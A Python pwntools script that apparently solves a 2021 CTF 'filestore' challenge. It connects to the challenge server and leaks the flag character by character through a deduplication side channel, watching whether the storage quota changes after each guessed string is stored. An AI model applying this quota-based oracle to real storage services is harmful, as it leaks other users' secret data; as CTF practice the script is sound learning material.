import string

from pwn import *


def search(flag):
    # with process(['python', 'filestore.py']) as io:
    with remote('filestore.2021.ctfcompetition.com', 1337) as io:

        def status():
            io.recvuntil(b'- exit\n')
            io.sendline(b'status')

            _ = io.recvuntil(b'\n').decode()[6:-1]      # User
            _ = io.recvuntil(b'\n').decode()[6:-1]      # Time
            quota = io.recvuntil(b'\n').decode()[7:-1]  # Quota
            _ = io.recvuntil(b'\n').decode()[7:-1]      # Files

            return quota

        def store(s):
            io.recvuntil(b'- exit\n')
            io.sendline(b'store')

            io.recvuntil(b'\n')
            io.sendline(s.encode())

            io.recvuntil(b'\n')
            fid = io.recvuntil(b'\n').decode()[:-1]

            return fid

        quota = status()

        for c in string.printable[:-6]:
            store(flag + c)
            t = status()
            if quota == t:
                return c
            quota = t

        return ''


def solve():
    context.log_level = 'WARN'

    flag = 'CTF{'

    while True:
        c = search(flag[-15:])
        flag += c

        print(flag)

        if c == '':
            return f'ERROR {flag}'

        if c == '}':
            return flag


if __name__ == '__main__':
    print(solve())
